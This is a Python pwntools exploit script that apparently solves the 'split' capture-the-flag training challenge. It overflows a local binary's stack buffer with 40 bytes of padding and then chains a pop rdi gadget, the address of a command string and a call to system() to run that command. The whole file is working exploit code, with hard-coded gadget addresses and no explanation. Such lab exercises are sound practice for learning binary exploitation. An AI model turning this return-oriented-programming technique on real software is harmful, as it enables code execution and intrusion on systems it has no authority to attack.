
import pwn as pwntools

bin = './split'

elf = pwntools.context.binary = pwntools.ELF(bin, checksec=False)
pwntools.context.log_level = 'info'

io = pwntools.process(argv=[], executable=bin)

padding = 40
system = 0x000000000040074b
pop_rdi_ret = 0x00000000004007c3
cat = 0x601060

payload = pwntools.flat(
    b'A' * padding,
    pwntools.pack(pop_rdi_ret),
    pwntools.pack(cat),
    pwntools.pack(system)
)

pwntools.write('py_payload', payload)

io.sendlineafter(b'> ', payload)

io.recvuntil(b"Thank you!\n")

pwntools.success(io.recvline().decode('utf-8'))
io.close()